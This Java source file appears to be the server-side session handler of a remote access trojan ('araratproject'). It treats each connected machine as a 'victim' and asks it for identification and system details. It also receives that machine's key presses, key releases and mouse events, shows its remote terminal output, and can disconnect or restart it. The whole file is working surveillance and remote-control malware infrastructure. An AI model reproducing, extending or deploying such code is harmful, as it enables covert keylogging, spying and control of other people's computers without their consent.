package araratproject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.text.SimpleDateFormat;

/**
 * The Session object is handling the communication between the host and the
 * Server. It receives, transmits, processes the data between the 2 peers.
 *
 * @version 0.1
 * @author Andreas Demosthenous
 * @since 11/06/2020
 */
public class Session {

    private Socket tcpSocket;
    private TCPReceiver receiver;
    private TCPTransmitter transmitter;
    private final String sessionID;
    private boolean isActive;
    private Victim victim;
    private VictimTab victimTab;
    private int connectionKeeper;
    private final Timer timer;
    private final ConnectionEstablisher establisher;

    /**
     * The constructor initializes the Session parts and starts the
     * identification process with the connected socket.
     *
     * @param tcpSocket the host socket
     * @param sessionID the id of the session
     * @throws IOException
     */
    public Session(Socket tcpSocket, String sessionID) throws IOException {

        this.tcpSocket = tcpSocket;
        this.sessionID = sessionID;

        this.isActive = true;

        //setting TCP transmitter/receiver
        transmitter = new TCPTransmitter(new PrintWriter(tcpSocket.getOutputStream(), true));
        receiver = new TCPReceiver(new BufferedReader(new InputStreamReader(tcpSocket.getInputStream())));
        receiver.start();

        //Setting the establisher and starting the identification process
        establisher = new ConnectionEstablisher();
        establisher.start();

        //starting the timer for the session
        connectionKeeper = 0;

        timer = new Timer(5);
        timer.start();

    }

    /**
     * Client restarts
     */
    public void restart() {
        Server.gui.appendLog(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> \"" + victim.getName() + "\" is Restarting.\n");
        closeSession(true);
    }

    /**
     * Terminator of the session.
     */
    public void closeSession(boolean disconnectVictim) {

        if (transmitter != null) {
            transmitter.sendString("DSCNT");
        }

        try {
            if (tcpSocket != null) {
                tcpSocket.close();
            }
            tcpSocket = null;
        } catch (IOException ex) {
            //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error closing the socket", JOptionPane.ERROR_MESSAGE);
        }
        //Destroying the sessions objects
        isActive = false;
        receiver = null;

        transmitter = null;
        //Disconnecting the victim
        if (disconnectVictim) {
            Server.gui.disconnectVictim(victim);
        }

        victim = null;
        victimTab = null;

        //Removing from the base
        Server.dataBase.remove(this);

        timer.interrupt();

    }

    /**
     *
     * @return whether the session is active.
     */
    public boolean isActive() {
        return isActive;
    }

    /**
     *
     * @return the Session id.
     */
    public String getSessionID() {
        return sessionID;
    }

    /**
     *
     * @return the victim bound in this session
     */
    public Victim getVictim() {
        return victim;
    }

    public boolean equals(Object obj) {
        if (obj == null) {
            return false;
        }
        if (obj.getClass() != this.getClass()) {
            return false;
        }
        Session sessobj = (Session) obj;
        return sessobj.sessionID.equals(this.sessionID);
    }

    /**
     * Transmitting data to the connected socket.
     *
     * @param data to transmit
     */
    public void transmitData(String data) {
        if (transmitter != null) {
            transmitter.sendString(data);
        }
    }

    //This class is a data receiver from the connected socket.
    private class TCPReceiver extends Thread {

        private BufferedReader br;
        private String data = "NULL", sysinfo = "";

        public TCPReceiver(BufferedReader br) {
            this.br = br;
        }

        public void run() {

            while (true) {
                try {

                    data = br.readLine();
                    if (data != null) {
                        connectionKeeper = 0;
                        new DataProcessor(data).process();
                    }

                } catch (IOException ex) {
                    //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error receiving data", JOptionPane.ERROR_MESSAGE);
                    this.interrupt();
                    break;
                } catch (InterruptedException ex) {
                    //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error processing data", JOptionPane.ERROR_MESSAGE);
                }
            }

        }

        public void setData(String data) {
            this.data = data;
        }

        public String getData() {
            return data;
        }
    }

    //This class is responsible fro identifying the connected host.
    private class ConnectionEstablisher extends Thread {

        private boolean identifyNetwork, identifySystem;

        ConnectionEstablisher() {
            identifyNetwork = false;
            identifySystem = false;
        }

        public void run() {
            int identifyMeter = 0;
            while (!identifyNetwork) {
                if (transmitter != null) {
                    //Sending identfication string
                    transmitter.sendString("IDNTF");
                    identifyMeter++;

                    //If the host dont repsond after 3 tries, socket is closed
                    if (identifyMeter >= 4) {
                        closeSession(true);
                        return;
                    }
                }

                try {
                    Thread.sleep(3000);
                } catch (InterruptedException ex) {
                    //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error", JOptionPane.ERROR_MESSAGE);
                }
            }

            while (!identifySystem) {
                if (transmitter != null) {
                    //Sending System identification String
                    transmitter.sendString("SINFO");
                }

                try {
                    Thread.sleep(3000);
                } catch (InterruptedException ex) {
                    //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error", JOptionPane.ERROR_MESSAGE);
                }
            }

            //Connection established succesfully
        }

        public void identifyNetwork() {
            identifyNetwork = true;
        }

        public void identifySystem() {
            identifySystem = true;
        }

        public boolean isNetworkIdentified() {
            return identifyNetwork;
        }

        public boolean isSystemIdentified() {
            return identifySystem;
        }
    }

    //Class for transmitting data to the connected host.
    private class TCPTransmitter {

        private PrintWriter pr;

        TCPTransmitter(PrintWriter pr) {
            this.pr = pr;
        }

        public void sendString(String msg) {
            pr.println(msg);
        }

    }

    //Class for processing the received data
    private class DataProcessor {

        String data;
        private String identifier = "";
        private String information = "";

        DataProcessor(String data) {
            if (data != null && data.length() > 5) {
                this.data = data;
                identifier = data.substring(0, 5);
                information = data.substring(5, data.length());
            }
        }

        public void process() throws InterruptedException, IOException {
            if (data == null) {
                return;
            }

            if (victim != null) {
                //Getting the tab of the victim
                victimTab = Server.controller.getTab(victim);
            }

            switch (identifier) {

                case "KEYPR":
                    if (victimTab != null) {
                        victimTab.keyPressed(information);
                    }
                    break;

                case "KEYRE":
                    if (victimTab != null) {
                        victimTab.keyReleased(information);
                    }
                    break;

                case "MSEPR":
                    if (victimTab != null) {
                        victimTab.mousePressed(information);
                    }
                    break;

                case "MSERE":
                    if (victimTab != null) {
                        victimTab.mouseReleased(information);
                    }
                    break;

                case "TRMNL":
                    if (victimTab != null) {
                        victimTab.appendTerminalArea(" " + information + "\n");
                    }
                    break;

                case "IDNTF":

                    //Splitting the information
                    String[] info = information.split(".-.-.");

                    //Ensuring the information correctness
                    if (info.length == 5) {

                        //Finding external ip
                        String ip = Toolset.extractIP(tcpSocket.getInetAddress().getHostAddress());
                        if (ip.length() >= 16) {
                            ip = ip.substring(0, 16);
                        }

                        //Initializing the Victim
                        victim = new Victim(info[0], ip, info[0], info[1], info[2], info[3], info[4], Session.this);

                        if (!Server.controller.addVictim(victim)) {
                            closeSession(false);
                            return;
                        }
                        victimTab = Server.controller.getTab(victim);
                        victim.addVictim();

                        //informing the establisher
                        if (establisher != null) {
                            establisher.identifyNetwork();
                        }

                    }

                    break;

                case "SINFO":

                    if (victimTab != null && establisher != null && establisher.isSystemIdentified()) {
                        victimTab.appendSysInfoArea(" " + information + "\n");
                    } else if (victimTab != null && establisher != null) {
                        victimTab.clearSysInfoArea();
                        victimTab.appendSysInfoArea(" " + information + "\n");
                        //informing the establisher
                        establisher.identifySystem();
                    }
                    break;

                case "DSCNT":
                    if (victim != null) {
                        Server.gui.disconnectVictim(victim);
                    }
                    break;
                case "RSTRT":
                    restart();
                    return;
            }
        }

    }

    //Timer for the session to constantly check connectivity with socket.
    private class Timer extends Thread {

        private int connectionLimit;
        private boolean start;

        public Timer(int connectionLimit) {
            this.connectionLimit = connectionLimit;
            start = true;
        }

        public void run() {
            while (isActive) {
                if (start) {
                    try {
                        Thread.sleep(1000);
                        connectionKeeper++;
                        if (connectionKeeper >= connectionLimit) {
                            closeSession(true);
                            break;
                        }
                    } catch (InterruptedException ex) {
                        //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error on timer", JOptionPane.ERROR_MESSAGE);
                    }
                }
            }
        }

        public void stopTimer() {
            start = false;
        }

        public void startTimer() {
            start = true;
        }

    }

}
